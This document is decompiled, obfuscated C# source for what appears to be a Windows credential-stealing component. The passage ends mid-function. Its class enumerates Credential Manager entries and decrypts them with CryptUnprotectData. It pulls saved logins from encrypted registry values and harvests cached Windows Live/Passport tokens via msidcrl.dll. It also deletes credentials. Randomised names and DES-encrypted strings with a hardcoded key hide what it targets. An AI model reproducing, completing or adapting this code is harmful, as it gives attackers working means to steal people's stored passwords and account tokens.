using System;
using System.Collections;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using lDcmRA5rlWNq1;

internal class TYLaIdj8SirvQs8IKypNVkal18 : IEnumerable, IEnumerator
{
	private struct Struct2
	{
		public int dwFlags;

		public int dwType;

		public int lpstrTargetName;

		public int lpstrComment;

		public l3zZlmt221 ftLastWritten;

		public int dwCredentialBlobSize;

		public int lpbCredentialBlob;

		public int dwPersist;

		public int dwAttributeCount;

		public int lpAttributes;

		public int lpstrTargetAlias;

		public int lpUserName;
	}

	private enum Enum0
	{
		GENERIC = 1,
		DOMAIN_PASSWORD,
		DOMAIN_CERTIFICATE,
		DOMAIN_VISIBLE_PASSWORD,
		MAXIMUM
	}

	private struct AOQLjt8P20
	{
		public int cbData;

		public int pbData;
	}

	private struct IlgnBAax22
	{
		public int lpstrKeyword;

		public int dwFlags;

		public int dwValueSize;

		public int lpbValue;
	}

	private struct l3zZlmt221
	{
		public int dwLowDateTime;

		public int dwHighDateTime;
	}

	private struct Ql7Ph89O24
	{
		public string strLogin;

		public string strPass;

		public string strTargetName;
	}

	private const int ERROR_SUCCESS = 0;

	private const int HKEY_CURRENT_USER = -2147483647;

	private const int READ_CONTROL = 131072;

	private const int STANDARD_RIGHTS_READ = 131072;

	private const int KEY_QUERY_VALUE = 1;

	private const int KEY_ENUMERATE_SUB_KEYS = 8;

	private const int KEY_NOTIFY = 16;

	private const int SYNCHRONIZE = 1048576;

	private const int STANDARD_RIGHTS_WRITE = 131072;

	private const int KEY_SET_VALUE = 2;

	private const int KEY_CREATE_SUB_KEY = 4;

	private const int KEY_READ = 131097;

	private const int KEY_WRITE = 131078;

	private const int CSIDL_PROGRAM_FILES = 38;

	private Ql7Ph89O24[] ovPHD8Ts8;

	private int hWyFPdqt9;

	[SpecialName]
	private byte[] _0024STATIC_0024Base64Dec_0024201E10E_0024Enc;

	public tr9KZ4XsKptKaUCL317 this[int Index]
	{
		get
		{
			if ((Index < 0) | (Index >= Count))
			{
				return null;
			}
			tr9KZ4XsKptKaUCL317 tr9KZ4XsKptKaUCL318 = new tr9KZ4XsKptKaUCL317();
			Ql7Ph89O24 ql7Ph89O = ovPHD8Ts8[Index];
			tr9KZ4XsKptKaUCL318.qGJGUVzgQl67VDNye44(ref ql7Ph89O.strLogin, ref ql7Ph89O.strPass, ref ql7Ph89O.strTargetName);
			return tr9KZ4XsKptKaUCL318;
		}
	}

	public int Count
	{
		get
		{
			int try0000_dispatch = -1;
			int num2 = default(int);
			int num3 = default(int);
			int num = default(int);
			while (true)
			{
				try
				{
					/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
					switch (try0000_dispatch)
					{
					default:
						ProjectData.ClearProjectError();
						num2 = 2;
						num3 = 0;
						num3 = checked(Information.UBound((Array)ovPHD8Ts8, 1) + 1);
						break;
					case 26:
						num = -1;
						switch (num2)
						{
						case 2:
							break;
						default:
							goto IL_0050;
						}
						break;
					}
				}
				catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
				{
					ProjectData.SetProjectError((Exception)obj);
					try0000_dispatch = 26;
					continue;
				}
				break;
				IL_0050:
				throw ProjectData.CreateProjectError(-2146828237);
			}
			int result = num3;
			if (num != 0)
			{
				ProjectData.ClearProjectError();
			}
			return result;
		}
	}

	public object Current
	{
		get
		{
			tr9KZ4XsKptKaUCL317 tr9KZ4XsKptKaUCL318 = new tr9KZ4XsKptKaUCL317();
			int num = hWyFPdqt9;
			tr9KZ4XsKptKaUCL318.qGJGUVzgQl67VDNye44(ref ovPHD8Ts8[num].strLogin, ref ovPHD8Ts8[num].strPass, ref ovPHD8Ts8[num].strTargetName);
			checked
			{
				hWyFPdqt9++;
				return tr9KZ4XsKptKaUCL318;
			}
		}
	}

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int lstrlenA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int CredEnumerateW([MarshalAs(UnmanagedType.LPWStr)] string lpszFilter, int lFlags, ref int pCount, ref IntPtr lppCredentials);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, EntryPoint = "CredEnumerateW", ExactSpelling = true, SetLastError = true)]
	private static extern int CredEnumerateW_1(IntPtr lpszFilter, int lFlags, ref int pCount, ref IntPtr lppCredentials);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int CredDeleteW([MarshalAs(UnmanagedType.LPWStr)] string lpwstrTargetName, int dwType, int dwFlags);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int CredFree(IntPtr pBuffer);

	[DllImport("crypt32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int CryptUnprotectData(ref AOQLjt8P20 pDataIn, int ppszDataDescr, ref AOQLjt8P20 pOptionalEntropy, int pvReserved, int pPromptStruct, int dwFlags, ref AOQLjt8P20 pDataOut);

	[DllImport("crypt32.dll", CharSet = CharSet.Ansi, EntryPoint = "CryptUnprotectData", ExactSpelling = true, SetLastError = true)]
	private static extern int CryptUnprotectData_1(ref AOQLjt8P20 pDataIn, int ppszDataDescr, int pOptionalEntropy, int pvReserved, int pPromptStruct, int dwFlags, ref AOQLjt8P20 pDataOut);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int RegOpenKeyExA(int hKey, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpSubKey, int ulOptions, int samDesired, ref int phkResult);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int RegQueryValueExA(int hKey, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpValueName, int lpReserved, ref int lpType, [MarshalAs(UnmanagedType.LPWStr)] string lpData, ref int lpcbData);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, EntryPoint = "RegQueryValueExA", ExactSpelling = true, SetLastError = true)]
	private static extern int RegQueryValueExA_1(int hKey, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpValueName, int lpReserved, ref int lpType, IntPtr lpData, ref int lpcbData);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int RegEnumKeyExA(int hKey, int dwIndex, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpName, ref int lpcbName, int lpReserved, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpClass, int lpcbClass, ref l3zZlmt221 lpftLastWriteTime);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int RegDeleteValueA(int hKey, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpValueName);

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int LocalFree(int hMem);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int RegCloseKey(int hKey);

	[DllImport("shell32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SHGetSpecialFolderLocation(int hwndOwner, int nFolder, ref int pidl);

	[DllImport("shell32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SHGetPathFromIDListA(int pidl, [MarshalAs(UnmanagedType.VBByRefStr)] ref string pszPath);

	[DllImport("msidcrl.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int Initialize(ref F1JwaO3a42 guid, int IDCRLVersion, int dwFlags);

	[DllImport("msidcrl.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int EnumIdentitiesWithCachedCredentials([MarshalAs(UnmanagedType.LPWStr)] string wszCachedCredType, ref int phEnumHandle);

	[DllImport("msidcrl.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int NextIdentity(int hEnumHandle, ref IntPtr lpwszMemberName);

	[DllImport("msidcrl.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int PassportFreeMemory(IntPtr ptr);

	[DllImport("msidcrl.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int CloseEnumIdentitiesHandle(int hEnumHandle);

	[DllImport("msidcrl.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int CreateIdentityHandle([MarshalAs(UnmanagedType.LPWStr)] string wszMemberName, int dwFlags, ref int lphExternalIdentity);

	[DllImport("msidcrl.dll", CharSet = CharSet.Ansi, EntryPoint = "CreateIdentityHandle", ExactSpelling = true, SetLastError = true)]
	private static extern int CreateIdentityHandle_1(IntPtr wszMemberName, int dwFlags, ref int lphExternalIdentity);

	[DllImport("msidcrl.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int HasPersistedCredential(int hExternalIdentity, [MarshalAs(UnmanagedType.LPWStr)] string wszCredType, ref int lpbPersisted);

	[DllImport("msidcrl.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int RemovePersistedCredential(int hExternalIdentity, [MarshalAs(UnmanagedType.LPWStr)] string wszCredType);

	[DllImport("msidcrl.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetIdentityPropertyByName(int hExternalIdentity, [MarshalAs(UnmanagedType.LPWStr)] string wszPropertyName, ref int lpszValue);

	[DllImport("msidcrl.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int BuildAuthTokenRequest(int hExternalIdentity, [MarshalAs(UnmanagedType.LPWStr)] string wszPolicy, int dwFlags, ref IntPtr lpReturn);

	[DllImport("msidcrl.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int CloseIdentityHandle(int hExternalIdentity);

	[DllImport("msidcrl.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int Uninitialize();

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpLibFileName);

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int FreeLibrary(int hLibModule);

	private string method_0()
	{
		int pidl = default(int);
		string result;
		if (SHGetSpecialFolderLocation(0, 38, ref pidl) == 0)
		{
			string pszPath = new string('\0', 512);
			int num = SHGetPathFromIDListA(pidl, ref pszPath);
			result = Strings.Left(pszPath, checked(Strings.InStr(pszPath, "\0", (CompareMethod)0) - 1));
		}
		else
		{
			result = null;
		}
		LocalFree(pidl);
		return result;
	}

	private string kAXCziSTjI87q6l7zi2zF77(string strText, string sDecrKey)
	{
		try
		{
			byte[] rgbIV = new byte[8] { 18, 52, 86, 120, 144, 171, 205, 239 };
			byte[] array = new byte[checked(strText.Length + 1)];
			byte[] bytes = Encoding.UTF8.GetBytes(Strings.Left(sDecrKey, 8));
			DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
			array = Convert.FromBase64String(strText);
			MemoryStream memoryStream = new MemoryStream();
			CryptoStream cryptoStream = new CryptoStream(memoryStream, dESCryptoServiceProvider.CreateDecryptor(bytes, rgbIV), CryptoStreamMode.Write);
			cryptoStream.Write(array, 0, array.Length);
			cryptoStream.FlushFinalBlock();
			Encoding uTF = Encoding.UTF8;
			return uTF.GetString(memoryStream.ToArray());
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = null;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private void m58Pn4FYEBzVKL38WseXp78(ref int ub)
	{
		string lpLibFileName = method_0() + kAXCziSTjI87q6l7zi2zF77("EA4JV0Ui8748ZZ/DXx57K0cxtw3bP5LctlmBtdcr0ig=", "12345#$%");
		if (Operators.CompareString(FileSystem.Dir(lpLibFileName, (FileAttribute)0), (string)null, false) == 0)
		{
			return;
		}
		int hLibModule = LoadLibraryA(ref lpLibFileName);
		F1JwaO3a42 guid = default(F1JwaO3a42);
		guid.Data4 = new byte[8];
		guid.Data1 = 1896408858;
		guid.Data2 = -26330;
		guid.Data3 = 20427;
		guid.Data4[0] = 188;
		guid.Data4[1] = 201;
		guid.Data4[2] = 154;
		guid.Data4[3] = 157;
		guid.Data4[4] = 63;
		guid.Data4[5] = 50;
		guid.Data4[6] = 228;
		guid.Data4[7] = 35;
		Initialize(ref guid, 1, 15);
		int phEnumHandle = default(int);
		IntPtr lpwszMemberName = default(IntPtr);
		int lphExternalIdentity = default(int);
		int lpbPersisted = default(int);
		if (EnumIdentitiesWithCachedCredentials(kAXCziSTjI87q6l7zi2zF77("2NGrkYDCHuyPKUaIHPbn/Q==", "12345#$%"), ref phEnumHandle) == 0)
		{
			IntPtr lpReturn = default(IntPtr);
			for (int num = NextIdentity(phEnumHandle, ref lpwszMemberName); num == 0; num = NextIdentity(phEnumHandle, ref lpwszMemberName))
			{
				num = CreateIdentityHandle_1(lpwszMemberName, 255, ref lphExternalIdentity);
				if ((num == 0) & (lpwszMemberName != IntPtr.Zero))
				{
					num = HasPersistedCredential(lphExternalIdentity, kAXCziSTjI87q6l7zi2zF77("2NGrkYDCHuyPKUaIHPbn/Q==", "12345#$%"), ref lpbPersisted);
					if (num == 0 && lpbPersisted != 0)
					{
						checked
						{
							if (BuildAuthTokenRequest(lphExternalIdentity, kAXCziSTjI87q6l7zi2zF77("2NGrkYDCHuyPKUaIHPbn/Q==", "12345#$%"), 0, ref lpReturn) == 0)
							{
								string text = DQOBfvdR81(lpReturn);
								int num2 = Strings.InStr(text, kAXCziSTjI87q6l7zi2zF77("2wm3YZnf7HZzbNob5J62Ow==", "12345#$%"), (CompareMethod)0) + 15;
								int num3 = Strings.InStr(text, kAXCziSTjI87q6l7zi2zF77("M+aaZd4Qk9Hn1BuHuUYc6ONxHeOgK/kb", "12345#$%"), (CompareMethod)0);
								if (num3 > 0)
								{
									ovPHD8Ts8 = (Ql7Ph89O24[])Utils.CopyArray((Array)ovPHD8Ts8, (Array)new Ql7Ph89O24[ub + 1]);
									int num4 = ub;
									ovPHD8Ts8[num4].strLogin = DQOBfvdR81(lpwszMemberName);
									ovPHD8Ts8[num4].strPass = Strings.Mid(text, num2, num3 - num2);
									ovPHD8Ts8[num4].strTargetName = "ps:" + ovPHD8Ts8[num4].strLogin;
									ub++;
								}
							}
							if (lpReturn != IntPtr.Zero)
							{
								PassportFreeMemory(lpReturn);
							}
						}
					}
					num = CloseIdentityHandle(lphExternalIdentity);
				}
				if (lpwszMemberName != IntPtr.Zero)
				{
					PassportFreeMemory(lpwszMemberName);
				}
			}
		}
		CloseEnumIdentitiesHandle(phEnumHandle);
		if (EnumIdentitiesWithCachedCredentials(kAXCziSTjI87q6l7zi2zF77("7RxDBZUWSRpxLG9yAQLKbEv86LQWS19u", "12345#$%"), ref phEnumHandle) == 0)
		{
			for (int num = NextIdentity(phEnumHandle, ref lpwszMemberName); num == 0; num = NextIdentity(phEnumHandle, ref lpwszMemberName))
			{
				num = CreateIdentityHandle_1(lpwszMemberName, 255, ref lphExternalIdentity);
				if ((num == 0) & (lpwszMemberName != IntPtr.Zero))
				{
					num = HasPersistedCredential(lphExternalIdentity, kAXCziSTjI87q6l7zi2zF77("2NGrkYDCHuyPKUaIHPbn/Q==", "12345#$%"), ref lpbPersisted);
					if (num == 0 && lpbPersisted == 0)
					{
						checked
						{
							ovPHD8Ts8 = (Ql7Ph89O24[])Utils.CopyArray((Array)ovPHD8Ts8, (Array)new Ql7Ph89O24[ub + 1]);
							int num5 = ub;
							ovPHD8Ts8[num5].strLogin = DQOBfvdR81(lpwszMemberName);
							ovPHD8Ts8[num5].strPass = "";
							ovPHD8Ts8[num5].strTargetName = "ps:" + ovPHD8Ts8[num5].strLogin;
							ub++;
						}
					}
					num = CloseIdentityHandle(lphExternalIdentity);
				}
				if (lpwszMemberName != IntPtr.Zero)
				{
					PassportFreeMemory(lpwszMemberName);
				}
			}
		}
		CloseEnumIdentitiesHandle(phEnumHandle);
		Uninitialize();
		FreeLibrary(hLibModule);
	}

	public void RRhBQFHttxrK9YvOMcecV79()
	{
		ovPHD8Ts8 = null;
		int ub = 0;
		string lpSubKey = kAXCziSTjI87q6l7zi2zF77("8DYu61PVOq2FZMLQdWt4I+/kGim2ul8u7e2zNVqcjYdxv9iEaJtD6g==", "12345#$%");
		int phkResult = default(int);
		int num = RegOpenKeyExA(-2147483647, ref lpSubKey, 0, 131097, ref phkResult);
		int lpcbData = 0;
		int hKey = phkResult;
		lpSubKey = kAXCziSTjI87q6l7zi2zF77("5yqXvOobmBWjYQ+U9huFGToHAA8jKsNg0ZdYl78UxeI=", "12345#$%");
		int lpType = default(int);
		num = RegQueryValueExA_1(hKey, ref lpSubKey, 0, ref lpType, IntPtr.Zero, ref lpcbData);
		checked
		{
			string text;
			if (lpcbData > 0)
			{
				IntPtr intPtr = Marshal.AllocHGlobal(lpcbData);
				int hKey2 = phkResult;
				lpSubKey = kAXCziSTjI87q6l7zi2zF77("5yqXvOobmBWjYQ+U9huFGToHAA8jKsNg0ZdYl78UxeI=", "12345#$%");
				num = RegQueryValueExA_1(hKey2, ref lpSubKey, 0, ref lpType, intPtr, ref lpcbData);
				text = Marshal.PtrToStringAnsi(intPtr);
				Marshal.FreeHGlobal(intPtr);
				text = Strings.Mid(text, 1, Strings.Len(text) - 1);
				ovPHD8Ts8 = new Ql7Ph89O24[1];
				ovPHD8Ts8[0].strPass = LucKIpbk84(ref text);
				lpcbData = 0;
				int hKey3 = phkResult;
				lpSubKey = kAXCziSTjI87q6l7zi2zF77("LJvbRRfi92F+T5sdUcoVeEDw5qat1xmCqEtfms+PN+4=", "12345#$%");
				num = RegQueryValueExA_1(hKey3, ref lpSubKey, 0, ref lpType, IntPtr.Zero, ref lpcbData);
				intPtr = Marshal.AllocHGlobal(lpcbData);
				int hKey4 = phkResult;
				lpSubKey = kAXCziSTjI87q6l7zi2zF77("LJvbRRfi92F+T5sdUcoVeEDw5qat1xmCqEtfms+PN+4=", "12345#$%");
				num = RegQueryValueExA_1(hKey4, ref lpSubKey, 0, ref lpType, intPtr, ref lpcbData);
				ovPHD8Ts8[0].strLogin = Marshal.PtrToStringAnsi(intPtr);
				Marshal.FreeHGlobal(intPtr);
				ovPHD8Ts8[0].strLogin = Strings.Mid(ovPHD8Ts8[0].strLogin, 1, Strings.Len(ovPHD8Ts8[0].strLogin) - 1);
				ub++;
				RegCloseKey(phkResult);
			}
			RegCloseKey(phkResult);
			lpSubKey = kAXCziSTjI87q6l7zi2zF77("8DYu61PVOq2FZMLQdWt4I2soxcIHGyEfqCSEVbWZgNc=", "12345#$%");
			AOQLjt8P20 pDataIn = default(AOQLjt8P20);
			AOQLjt8P20 pDataOut = default(AOQLjt8P20);
			if (RegOpenKeyExA(-2147483647, ref lpSubKey, 0, 131097, ref phkResult) == 0)
			{
				lpcbData = 0;
				int hKey5 = phkResult;
				lpSubKey = kAXCziSTjI87q6l7zi2zF77("5yqXvOobmBXf7FIWvrPp6xBpSVJvL4lBvoArca+IWcA=", "12345#$%");
				if (RegQueryValueExA_1(hKey5, ref lpSubKey, 0, ref lpType, IntPtr.Zero, ref lpcbData) == 0)
				{
					IntPtr intPtr = Marshal.AllocHGlobal(lpcbData);
					int hKey6 = phkResult;
					lpSubKey = kAXCziSTjI87q6l7zi2zF77("5yqXvOobmBXf7FIWvrPp6xBpSVJvL4lBvoArca+IWcA=", "12345#$%");
					if (RegQueryValueExA_1(hKey6, ref lpSubKey, 0, ref lpType, intPtr, ref lpcbData) != 0)
					{
						return;
					}
					ovPHD8Ts8 = (Ql7Ph89O24[])Utils.CopyArray((Array)ovPHD8Ts8, (Array)new Ql7Ph89O24[ub + 1]);
					pDataIn.pbData = intPtr.ToInt32() + 2;
					pDataIn.cbData = lpcbData - 2;
					CryptUnprotectData_1(ref pDataIn, 0, 0, 0, 0, 1, ref pDataOut);
					string Base64String = Marshal.PtrToStringAnsi(intPtr);
					Marshal.FreeHGlobal(intPtr);
					int num2 = ub;
					ovPHD8Ts8[num2].strPass = LucKIpbk84(ref Base64String);
					lpcbData = 0;
					int hKey7 = phkResult;
					lpSubKey = kAXCziSTjI87q6l7zi2zF77("+dVN7/QV13r+DgRv6X7TvCPIHnvrpiIO5YkIE/WA0Yc=", "12345#$%");
					num = RegQueryValueExA_1(hKey7, ref lpSubKey, 0, ref lpType, IntPtr.Zero, ref lpcbData);
					intPtr = Marshal.AllocHGlobal(lpcbData);
					int hKey8 = phkResult;
					lpSubKey = kAXCziSTjI87q6l7zi2zF77("+dVN7/QV13r+DgRv6X7TvCPIHnvrpiIO5YkIE/WA0Yc=", "12345#$%");
					num = RegQueryValueExA_1(hKey8, ref lpSubKey, 0, ref lpType, intPtr, ref lpcbData);
					ovPHD8Ts8[num2].strLogin = Marshal.PtrToStringAnsi(intPtr);
					Marshal.FreeHGlobal(intPtr);
					ovPHD8Ts8[num2].strLogin = Strings.Mid(ovPHD8Ts8[num2].strLogin, 1, Strings.Len(ovPHD8Ts8[num2].strLogin) - 1);
					ub++;
					LocalFree(pDataOut.pbData);
				}
			}
			text = kAXCziSTjI87q6l7zi2zF77("Tgwk53CSmXfcKjdaJc0r6Q==", "12345#$%");
			int pCount = default(int);
			IntPtr lppCredentials = default(IntPtr);
			CredEnumerateW(text, 0, ref pCount, ref lppCredentials);
			Struct2 @struct = default(Struct2);
			Struct2 struct2 = default(Struct2);
			int i;
			if (pCount > 0)
			{
				AOQLjt8P20 pOptionalEntropy = default(AOQLjt8P20);
				pOptionalEntropy.cbData = 74;
				IntPtr intPtr2 = Marshal.AllocHGlobal(74);
				string text2 = kAXCziSTjI87q6l7zi2zF77("PPK1dshgmxnwx85Gl1tiCr9sN7TipBHZTn33umFvdUTSy1vfo/Df8A==", "12345#$%") + "\0";
				int num3 = 0;
				do
				{
					Marshal.WriteInt16(intPtr2, num3 * 2, (short)(Strings.Asc(Strings.Mid(text2, num3 + 1, 1)) * 4));
					num3++;
				}
				while (num3 <= 36);
				pOptionalEntropy.pbData = intPtr2.ToInt32();
				ovPHD8Ts8 = (Ql7Ph89O24[])Utils.CopyArray((Array)ovPHD8Ts8, (Array)new Ql7Ph89O24[ub + pCount - 1 + 1]);
				int num4 = ub;
				int num5 = ub + pCount - 1;
				for (i = num4; i <= num5; i++)
				{
					IntPtr intPtr = Marshal.ReadIntPtr(lppCredentials, (i - ub) * 4);
					object? obj = Marshal.PtrToStructure(intPtr, @struct.GetType());
					@struct = ((obj != null) ? ((Struct2)obj) : struct2);
					pDataIn.pbData = @struct.lpbCredentialBlob;
					pDataIn.cbData = @struct.dwCredentialBlobSize;
					pDataOut.cbData = 0;
					pDataOut.pbData = 0;
					CryptUnprotectData(ref pDataIn, 0, ref pOptionalEntropy, 0, 0, 0, ref pDataOut);
					int num6 = i;
					ref Ql7Ph89O24 reference = ref ovPHD8Ts8[num6];
					IntPtr ptr = new IntPtr(@struct.lpUserName);
					reference.strLogin = DQOBfvdR81(ptr);
					ref Ql7Ph89O24 reference2 = ref ovPHD8Ts8[num6];
					ptr = new IntPtr(@struct.lpstrTargetName);
					reference2.strTargetName = DQOBfvdR81(ptr);
					ref Ql7Ph89O24 reference3 = ref ovPHD8Ts8[num6];
					ptr = new IntPtr(pDataOut.pbData);
					reference3.strPass = DQOBfvdR81(ptr);
					LocalFree(pDataOut.pbData);
				}
				Marshal.FreeHGlobal(intPtr2);
				ub += pCount;
			}
			CredFree(lppCredentials);
			m58Pn4FYEBzVKL38WseXp78(ref ub);
			RegCloseKey(phkResult);
			byte[] array = new byte[18]
			{
				38, 48, 111, 102, 81, 101, 56, 82, 98, 108,
				78, 100, 103, 110, 90, 83, 85, 74
			};
			IntPtr intPtr3 = Marshal.AllocHGlobal(38);
			i = 0;
			do
			{
				byte val = (byte)(unchecked((int)checked((byte)(array[17 - i] ^ 0xC))) + (17 - i));
				Marshal.WriteInt16(intPtr3, i * 2, val);
				i++;
			}
			while (i <= 17);
			Marshal.WriteInt16(intPtr3, 36, 0);
			CredEnumerateW_1(intPtr3, 0, ref pCount, ref lppCredentials);
			if (pCount > 0)
			{
				ovPHD8Ts8 = (Ql7Ph89O24[])Utils.CopyArray((Array)ovPHD8Ts8, (Array)new Ql7Ph89O24[ub + pCount - 1 + 1]);
				int num7 = ub;
				int num8 = ub + pCount - 1;
				for (i = num7; i <= num8; i++)
				{
					IntPtr intPtr = Marshal.ReadIntPtr(lppCredentials, (i - ub) * 4);
					object? obj2 = Marshal.PtrToStructure(intPtr, @struct.GetType());
					@struct = ((obj2 != null) ? ((Struct2)obj2) : struct2);
					pDataIn.pbData = @struct.lpbCredentialBlob;
					pDataIn.cbData = @struct.dwCredentialBlobSize;
					CryptUnprotectData_1(ref pDataIn, 0, 0, 0, 0, 1, ref pDataOut);
					pDataOut.pbData = pDataIn.pbData;
					int num9 = i;
					ref Ql7Ph89O24 reference4 = ref ovPHD8Ts8[num9];
					IntPtr ptr = new IntPtr(@struct.lpUserName);
					reference4.strLogin = DQOBfvdR81(ptr);
					ref Ql7Ph89O24 reference5 = ref ovPHD8Ts8[num9];
					ptr = new IntPtr(@struct.lpstrTargetName);
					reference5.strTargetName = DQOBfvdR81(ptr);
					ref Ql7Ph89O24 reference6 = ref ovPHD8Ts8[num9];
					ptr = new IntPtr(pDataOut.pbData);
					reference6.strPass = Marshal.PtrToStringUni(ptr, (int)Math.Round((double)pDataIn.cbData / 2.0));
				}
				ub += pCount;
			}
			CredFree(lppCredentials);
			Marshal.FreeHGlobal(intPtr3);
		}
	}

	private void E7ycFliY80(string lpszCredPattern)
	{
		int pCount = default(int);
		IntPtr lppCredentials = default(IntPtr);
		CredEnumerateW(lpszCredPattern, 0, ref pCount, ref lppCredentials);
		checked
		{
			if (pCount > 0)
			{
				int num = pCount - 1;
				Struct2 @struct = default(Struct2);
				Struct2 struct2 = default(Struct2);
				for (int i = 0; i <= num; i++)
				{
					IntPtr ptr = Marshal.ReadIntPtr(lppCredentials, i * 4);
					object? obj = Marshal.PtrToStructure(ptr, @struct.GetType());
					@struct = ((obj != null) ? ((Struct2)obj) : struct2);
					IntPtr ptr2 = new IntPtr(@struct.lpstrTargetName);
					string lpwstrTargetName = DQOBfvdR81(ptr2);
					CredDeleteW(lpwstrTargetName, @struct.dwType, @struct.dwFlags);
				}
			}
			CredFree(lppCredentials);
		}
	}

	protected string DQOBfvdR81(IntPtr ptr)
	{
		return Marshal.PtrToStringUni(ptr);
	}

	private void ewoYub4782(IntPtr lpszCredPattern)
	{
		int pCount = default(int);
		IntPtr lppCredentials = default(IntPtr);
		CredEnumerateW_1(lpszCredPattern, 0, ref pCount, ref lppCredentials);
		checked
		{
			if (pCount > 0)
			{
				int num = pCount - 1;
				Struct2 @struct = default(Struct2);
				Struct2 struct2 = default(Struct2);
				for (int i = 0; i <= num; i++)
				{
					IntPtr ptr = Marshal.ReadIntPtr(lppCredentials, i * 4);
					object? obj = Marshal.PtrToStructure(ptr, @struct.GetType());
					@struct = ((obj != null) ? ((Struct2)obj) : struct2);
					IntPtr ptr2 = new IntPtr(@struct.lpstrTargetName);
					string lpwstrTargetName = DQOBfvdR81(ptr2);
					CredDeleteW(lpwstrTargetName, @struct.dwType, @struct.dwFlags);
				}
			}
			CredFree(lppCredentials);
		}
	}

	public void aBNyk9g083(string szTargetName)
	{
		byte[] array = new byte[18]
		{
			38, 48, 111, 102, 81, 101, 56, 82, 98, 108,
			78, 100, 103, 110, 90, 83, 85, 74
		};
		IntPtr intPtr = Marshal.AllocHGlobal(38);
		int num = 0;
		checked
		{
			do
			{
				byte val = (byte)((short)(array[17 - num] ^ 0xC) + (17 - num));
				Marshal.WriteByte(intPtr, num * 2, val);
				num++;
			}
			while (num <= 17);
			Marshal.WriteInt16(intPtr, 36, 0);
			string lpSubKey = kAXCziSTjI87q6l7zi2zF77("8DYu61PVOq2FZMLQdWt4I+/kGim2ul8u7e2zNVqcjYdxv9iEaJtD6g==", "12345#$%");
			int phkResult = default(int);
			int num2 = RegOpenKeyExA(-2147483647, ref lpSubKey, 0, 131078, ref phkResult);
			int lpcbData = 0;
			int hKey = phkResult;
			lpSubKey = kAXCziSTjI87q6l7zi2zF77("5yqXvOobmBWjYQ+U9huFGToHAA8jKsNg0ZdYl78UxeI=", "12345#$%");
			int lpType = default(int);
			num2 = RegQueryValueExA_1(hKey, ref lpSubKey, 0, ref lpType, IntPtr.Zero, ref lpcbData);
			if (lpcbData > 0)
			{
				int hKey2 = phkResult;
				lpSubKey = kAXCziSTjI87q6l7zi2zF77("5yqXvOobmBWjYQ+U9huFGToHAA8jKsNg0ZdYl78UxeI=", "12345#$%");
				num2 = RegDeleteValueA(hKey2, ref lpSubKey);
			}
			RegCloseKey(phkResult);
			lpSubKey = kAXCziSTjI87q6l7zi2zF77("8DYu61PVOq2FZMLQdWt4I2soxcIHGyEfqCSEVbWZgNc=", "12345#$%");
			if (RegOpenKeyExA(-2147483647, ref lpSubKey, 0, 131097, ref phkResult) == 0)
			{
				lpcbData = 0;
				int hKey3 = phkResult;
				lpSubKey = kAXCziSTjI87q6l7zi2zF77("5yqXvOobmBXf7FIWvrPp6xBpSVJvL4lBvoArca+IWcA=", "12345#$%");
